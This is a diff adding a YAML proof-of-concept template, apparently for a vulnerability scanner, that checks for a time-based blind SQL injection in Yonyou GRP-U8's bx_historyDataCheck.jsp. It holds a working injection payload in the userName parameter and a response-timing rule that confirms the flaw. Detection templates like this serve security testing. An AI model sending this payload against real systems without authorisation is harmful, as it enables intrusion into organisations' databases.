@@ -1,0 +1,14 @@
+id: poc-yaml-yongyou-grpu8-sql-injection
+info:
+  name: 用友GRP-U8-bx_historyDataCheck-SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: GRP-U8
+variables:
+  t1: random_int(5,10)
+requests:
+- method: GET
+  path: /u8qx/bx_historyDataCheck.jsp?userName=1'waitfor+delay'00:00:{{.t1}}&ysnd=0&historyFlag=2
+  expression: status_code == 200 && trim(body) == "0" && duration > t1
+transport: http
